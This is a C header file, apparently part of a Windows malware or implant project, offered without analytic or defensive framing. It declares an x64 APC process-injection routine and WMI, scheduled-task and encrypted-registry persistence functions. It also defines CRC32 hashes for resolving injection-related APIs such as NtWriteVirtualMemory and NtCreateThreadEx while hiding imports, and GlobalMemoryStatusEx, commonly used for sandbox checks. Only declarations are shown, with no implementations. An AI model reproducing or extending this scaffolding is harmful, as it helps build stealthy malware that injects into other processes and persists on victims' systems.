#pragma once

#include <Windows.h>
#include <stdint.h>
#include <taskschd.h>

#pragma comment(lib, "taskschd.lib")

BOOL QueueAPCInject_x64(HANDLE hProc, PVOID remoteAddr);
#include "jitdecrypt.h"

BOOL WMIPersistence();
BOOL COMScheduledTaskPersistence();
BOOL EncryptedRegistryPersistence();

// CRC32 hashes for API functions
#define CRC32_CREATEPROCESSW 0x16b32446
#define CRC32_OPENPROCESS 0x3DEE4534
#define CRC32_NTALLOCATEVIRTUALMEMORY 0xf5bd3734
#define CRC32_NTWRITEVIRTUALMEMORY 0x5a344378
#define CRC32_NTCREATETHREADEX 0xaf28d289
#define CRC32_NTCLOSE 0x23af593a
#define CRC32_GLOBALMEMORYSTATUSEX 0x8b7c4b8e
#define CRC32_CREATEFILEW 0x7c7ea48
#define CRC32_DEVICEIOCONTROL 0x2f5a914c
#define CRC32_UPDATEPROCTHREADATTRIBUTE 0x1d8a6317
#define CRC32_INITIALIZEPROCTHREADATTRIBUTELIST 0x3c2b6b3
#define CRC32_DELETEPROCTHREADATTRIBUTELIST 0x2a998b3c

// Structure to hold the resolved function pointers
typedef struct _API_FUNCTIONS {
    FARPROC pCreateProcessW;
    FARPROC pOpenProcess;
    FARPROC pNtAllocateVirtualMemory;
    FARPROC pNtWriteVirtualMemory;
    FARPROC pNtCreateThreadEx;
    FARPROC pNtClose;
    FARPROC pGlobalMemoryStatusEx;
    FARPROC pCreateFileW;
    FARPROC pDeviceIoControl;
    FARPROC pUpdateProcThreadAttribute;
    FARPROC pInitializeProcThreadAttributeList;
    FARPROC pDeleteProcThreadAttributeList;
} API_FUNCTIONS, *PAPI_FUNCTIONS;
